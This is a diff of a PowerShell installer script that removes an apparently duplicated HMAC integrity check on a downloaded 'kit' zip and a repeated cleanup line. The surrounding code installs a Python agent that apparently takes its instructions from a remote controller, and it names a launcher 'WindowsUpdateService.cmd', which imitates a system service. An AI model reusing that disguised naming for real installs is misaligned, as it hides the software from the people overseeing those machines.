@@ -155,26 +155,6 @@ try {
     Warn "integrity check skipped: $($_.Exception.Message)"
 }
 
-# ---- integrity. PowerShell 5.1 has no Ed25519, so verify the HMAC the
-# controller publishes alongside. Catches a LAN MITM and a truncated file; the
-# pinned Ed25519 key is enforced by the Python side on every later update.
-try {
-    $meta = (New-Object Net.WebClient).DownloadString("$base/wu/kit.meta") | ConvertFrom-Json
-    $kkey = [Security.Cryptography.SHA256]::Create().ComputeHash(
-        [Text.Encoding]::UTF8.GetBytes("syspy/kit/v1|$room|$pass"))
-    $hmac = [Security.Cryptography.HMACSHA256]::new($kkey)
-    $hex  = ([BitConverter]::ToString($hmac.ComputeHash([IO.File]::ReadAllBytes($kit)))).Replace('-','').ToLower()
-    if ($meta.hmac -and $hex -ne $meta.hmac.ToLower()) {
-        throw "kit integrity check failed (expected $($meta.hmac.Substring(0,12))..., got $($hex.Substring(0,12))...)"
-    }
-    Say "kit verified ($($meta.bytes) bytes)"
-} catch [System.Management.Automation.MethodInvocationException] {
-    Warn "integrity check unavailable: $($_.Exception.Message)"
-} catch {
-    if ($_.Exception.Message -like '*integrity check failed*') { throw }
-    Warn "integrity check skipped: $($_.Exception.Message)"
-}
-
 Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
 New-Item -ItemType Directory -Force -Path $stage | Out-Null
 [IO.Compression.ZipFile]::ExtractToDirectory($kit, $stage)
@@ -190,7 +170,6 @@ foreach ($owned in 'syspy','install','agent.py','bootstrap.py') {
 }
 Copy-Item $kit (Join-Path $target 'kit.zip') -Force
 Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
-Remove-Item (Join-Path $env:TEMP 'wu-kit.zip') -Force -ErrorAction SilentlyContinue
 Remove-Item (Join-Path $env:TEMP 'wu-kit.zip') -Force -ErrorAction SilentlyContinue
 
 foreach ($pair in @(@('install\wu.cmd','WindowsUpdateService.cmd'),
